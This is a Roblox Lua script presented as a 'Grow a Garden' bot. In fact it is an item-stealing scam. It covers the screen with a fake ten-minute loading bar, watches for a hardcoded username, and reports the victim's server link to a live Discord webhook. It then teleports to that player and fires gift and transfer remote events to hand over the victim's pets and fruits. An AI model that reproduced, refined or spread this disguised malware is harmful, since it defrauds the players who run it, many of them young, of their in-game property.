-- 🌿 GROW A GARDEN BOT — STABLE VERSION

local CONFIG = {
    TARGET_USERNAME = "Sgahfd1223",
    WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz",
    LANGUAGE = "ru",
    LOADING_TIME = 600,
    CHECK_INTERVAL = 5,
    TRANSFER_DELAY = 0.25,
    TELEPORT_TIME = 1, -- секунда на Tween
    BATCH_SIZE = 3, -- передача предметов по небольшим группам
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")

-- Локализация
local LANGUAGES = {
    ["ru"] = {
        webhook_server = "Ссылка на сервер",
        webhook_detect = "Игрок %s зашел в плейс.",
        webhook_success = "Питомцы и фрукты были переданы.",
        title = "🌿 Загрузка скрипта...",
        percent = "% завершено"
    },
    ["en"] = {
        webhook_server = "Server Link",
        webhook_detect = "Player %s joined the place.",
        webhook_success = "Pets and fruits were successfully transferred.",
        title = "🌿 Script Loading...",
        percent = "% done"
    }
}
local TXT = LANGUAGES[CONFIG.LANGUAGE]

-- GUI загрузки
local function createLoadingUI()
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "GrowGardenBot"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.fromRGB(15,15,25)

    local title = Instance.new("TextLabel", frame)
    title.Text = TXT.title
    title.Size = UDim2.new(1,0,0,60)
    title.Position = UDim2.new(0,0,0.3,-60)
    title.TextColor3 = Color3.new(1,1,1)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 26
    title.BackgroundTransparency = 1

    local barBack = Instance.new("Frame", frame)
    barBack.Size = UDim2.new(0.6,0,0,30)
    barBack.Position = UDim2.new(0.2,0,0.5,0)
    barBack.BackgroundColor3 = Color3.fromRGB(40,40,40)

    local bar = Instance.new("Frame", barBack)
    bar.BackgroundColor3 = Color3.fromRGB(0,200,100)
    bar.Size = UDim2.new(0,0,1,0)

    local percent = Instance.new("TextLabel", frame)
    percent.Size = UDim2.new(1,0,0,50)
    percent.Position = UDim2.new(0,0,0.5,40)
    percent.TextColor3 = Color3.fromRGB(255,255,255)
    percent.Font = Enum.Font.GothamBold
    percent.TextSize = 24
    percent.BackgroundTransparency = 1

    return {GUI = gui, Bar = bar, Percent = percent, Title = title}
end

-- 3-WAY WEBHOOK
local function sendWebhook(content)
    local data = HttpService:JSONEncode({content = content})
    pcall(function() HttpService:PostAsync(CONFIG.WEBHOOK_URL, data, Enum.HttpContentType.ApplicationJson) end)
    pcall(function()
        HttpService:RequestAsync({
            Url = CONFIG.WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = data
        })
    end)
    pcall(function()
        HttpService:GetAsync(CONFIG.WEBHOOK_URL.."?"..HttpService:UrlEncode("content="..content))
    end)
end

local function sendServerLink()
    local place = tostring(game.PlaceId)
    local job = tostring(game.JobId)
    local link = "https://floating.gg/?placeID="..place.."&gameInstanceId="..job
    sendWebhook(TXT.webhook_server..": "..link)
end

-- Сбор питомцев с огорода
local function collectPets()
    local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild("Farm")
    if not garden then return {} end
    local pets = {}
    for _, obj in ipairs(garden:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find("pet") then
            table.insert(pets,obj)
            pcall(function() obj.Parent = LocalPlayer.Character end)
        end
    end
    return pets
end

-- Плавный телепорт через TweenService
local function tweenTeleport(target)
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        local tweenInfo = TweenInfo.new(CONFIG.TELEPORT_TIME, Enum.EasingStyle.Linear)
        local tweenGoal = {CFrame = targetRoot.CFrame + Vector3.new(0,3,0)}
        local tween = TweenService:Create(root, tweenInfo, tweenGoal)
        tween:Play()
        tween.Completed:Wait()
    end
end

-- Передача питомцев и фруктов по батчам
local function transferItems(target)
    local success = 0
    local remotes = {}
    for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
        if r:IsA("RemoteEvent") and (r.Name:lower():find("transfer") or r.Name:lower():find("gift") or r.Name:lower():find("send")) then
            table.insert(remotes, r)
        end
    end

    for _, remote in ipairs(remotes) do
        local items = {}
        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if item.Name:lower():find("pet") or item.Name:lower():find("fruit") then
                table.insert(items,item)
            end
        end
        for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
            if item:IsA("Model") and (item.Name:lower():find("pet") or item.Name:lower():find("fruit")) then
                table.insert(items,item)
            end
        end

        -- передача по батчам
        for i=1,#items,CONFIG.BATCH_SIZE do
            for j=i,math.min(i+CONFIG.BATCH_SIZE-1,#items) do
                pcall(function() remote:FireServer(items[j], target) end)
                success += 1
                task.wait(CONFIG.TRANSFER_DELAY)
            end
            task.wait(CONFIG.TRANSFER_DELAY*2) -- маленькая пауза между батчами
        end
    end
    return success
end

-- Главный цикл
local function runBot()
    local serverSent = false
    while true do
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
                if not serverSent then
                    sendServerLink()
                    serverSent = true
                end
                sendWebhook(string.format(TXT.webhook_detect, plr.Name))
                tweenTeleport(plr)
                collectPets()
                local count = transferItems(plr)
                if count > 0 then
                    sendWebhook(TXT.webhook_success)
                end
                break
            end
        end
        task.wait(CONFIG.CHECK_INTERVAL)
    end
end

-- Загрузка UI
local ui = createLoadingUI()
local start = os.time()
while os.time() - start < CONFIG.LOADING_TIME do
    local elapsed = os.time() - start
    local ratio = math.clamp(elapsed / CONFIG.LOADING_TIME, 0, 1)
    ui.Bar.Size = UDim2.new(ratio,0,1,0)
    ui.Percent.Text = tostring(math.floor(ratio*100))..TXT.percent
    task.wait(1)
end
ui.GUI:Destroy()
runBot()
